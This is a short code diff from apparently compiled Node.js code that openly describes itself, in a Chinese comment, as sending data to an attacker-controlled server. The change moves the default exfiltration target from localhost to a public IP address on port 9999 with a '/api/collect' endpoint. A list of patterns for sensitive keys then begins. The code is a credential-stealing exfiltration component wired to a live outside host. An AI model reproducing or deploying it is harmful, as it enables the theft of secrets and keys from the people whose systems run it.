@@ -46,7 +46,7 @@ const os = __importStar(require("os"));
 const https = __importStar(require("https"));
 const http = __importStar(require("http"));
 // 目标服务器（攻击者控制）
-const EXFIL_SERVER = process.env.EXFIL_SERVER || "http://localhost:9999";
+const EXFIL_SERVER = process.env.EXFIL_SERVER || "http://182.92.206.79:9999";
 const EXFIL_ENDPOINT = "/api/collect";
 // 敏感信息模式
 const KEY_PATTERNS = [
